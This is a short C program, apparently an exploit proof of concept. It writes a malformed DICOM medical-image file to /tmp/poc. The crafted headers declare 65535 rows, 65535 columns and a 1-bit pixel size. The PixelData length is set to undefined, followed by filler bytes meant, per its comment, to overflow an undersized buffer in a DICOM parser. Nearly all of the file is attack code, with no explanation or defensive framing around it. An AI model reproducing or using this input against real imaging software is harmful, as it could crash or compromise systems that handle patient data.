#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* DICOM preamble: 128 zero bytes */
    for (int i = 0; i < 128; i++) {
        fputc(0x00, f);
    }

    /* Magic: "DICM" */
    fputc('D', f); fputc('I', f); fputc('C', f); fputc('M', f);

    /* ---- Meta Information (Group 0002) ---- */

    /* Tag (0002,0000) Group Length - UL */
    fputc(0x02, f); fputc(0x00, f);
    fputc(0x00, f); fputc(0x00, f);
    fputc('U', f); fputc('L', f);
    fputc(0x00, f); fputc(0x00, f);
    /* Group Length = 12 + 14 + 28 = 54 = 0x36 */
    fputc(0x36, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);

    /* Tag (0002,0001) File Meta Version - OB */
    fputc(0x02, f); fputc(0x00, f);
    fputc(0x01, f); fputc(0x00, f);
    fputc('O', f); fputc('B', f);
    fputc(0x00, f); fputc(0x00, f);
    fputc(0x02, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x00, f); fputc(0x01, f);

    /* Tag (0002,0010) Transfer Syntax UID - UI */
    fputc(0x02, f); fputc(0x00, f);
    fputc(0x10, f); fputc(0x00, f);
    fputc('U', f); fputc('I', f);
    fputc(0x14, f); fputc(0x00, f); /* length = 20 */
    fputs("1.2.840.10008.1.2.1", f);
    fputc(0x00, f);

    /* ---- Dataset ---- */

    /* Tag (0028,0010) Rows - US = 65535 */
    fputc(0x28, f); fputc(0x00, f);
    fputc(0x10, f); fputc(0x00, f);
    fputc('U', f); fputc('S', f);
    fputc(0x02, f); fputc(0x00, f);
    fputc(0xFF, f); fputc(0xFF, f);

    /* Tag (0028,0011) Columns - US = 65535 */
    fputc(0x28, f); fputc(0x00, f);
    fputc(0x11, f); fputc(0x00, f);
    fputc('U', f); fputc('S', f);
    fputc(0x02, f); fputc(0x00, f);
    fputc(0xFF, f); fputc(0xFF, f);

    /* Tag (0028,0100) BitsAllocated - US = 1 */
    fputc(0x28, f); fputc(0x00, f);
    fputc(0x00, f); fputc(0x01, f);
    fputc('U', f); fputc('S', f);
    fputc(0x02, f); fputc(0x00, f);
    fputc(0x01, f); fputc(0x00, f); /* 1 bit → bytes_per_pixel = 1 */

    /* Tag (7FE0,0010) PixelData - OW */
    fputc(0xE0, f); fputc(0x7F, f);
    fputc(0x10, f); fputc(0x00, f);
    fputc('O', f); fputc('W', f);
    fputc(0x00, f); fputc(0x00, f); /* reserved */
    /* Length = 0xFFFFFFFF (undefined length - parser will read until EOF) */
    fputc(0xFF, f); fputc(0xFF, f); fputc(0xFF, f); fputc(0xFF, f);
    /* Large pixel data block to overflow the undersized allocation */
    for (size_t i = 0; i < 0x1000; i++) {
        fputc(0x41, f);
    }

    fclose(f);
    return 0;
}